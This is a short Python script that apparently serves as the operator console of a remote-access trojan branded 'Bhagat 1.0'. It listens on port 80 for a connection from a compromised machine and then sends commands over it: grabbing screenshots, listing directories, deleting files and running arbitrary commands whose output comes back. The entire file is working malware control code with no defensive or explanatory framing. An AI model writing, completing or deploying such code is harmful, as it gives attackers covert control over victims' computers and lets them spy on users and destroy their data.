import sys
import os
import time
from random import randint
import pywin
import socket

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = socket.gethostname()
port = 80
serversocket.bind((host, port))
serversocket.listen(1)

print('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||
  ____  _                       _     __        ___   
 |  _ \| |                     | |   /_ |      / _ \  
 | |_) | |__   __ _  __ _  __ _| |_   | |     | | | | 
 |  _ <| '_ \ / _` |/ _` |/ _` | __|  | |     | | | | 
 | |_) | | | | (_| | (_| | (_| | |_   | |  _  | |_| | 
 |____/|_| |_|\__,_|\__, |\__,_|\__|  |_| (_)  \___/  
                     __/ |                            
                    |___/                             
||||||||||||||||||||||||||||||||||||||||||||||||||||||||
''')
clientsocket, addr = serversocket.accept()
print('Connection from {}'.format(addr))
while True:
    msg = input('ENTER COMMAND:')
    if msg == "help":
        print('Confirm')
    elif msg == "ss":
        f = open("Screenshot.png", "wb")
        while True:
            data = clientsocket.recv(4096)
            if not data:
                break
            f.write(data)
        f. close()
        print('File downloaded.')
    elif msg == "listdir":
        path = input('Enter file path:')
        clientsocket.send(path.encode())
        print('Listing contents:')
        data = clientsocket.recv(1024).decode()
        print(data)
    elif msg == "deletefile":
        file = input('Enter file path:')
        clientsocket.send(file.encode())
        print('Deleting file...')
    else:
        msg = msg.encode("UTF-8")
        clientsocket.send(msg)
        msg = clientsocket.recv(4096)
        print(msg.decode("UTF-8"))
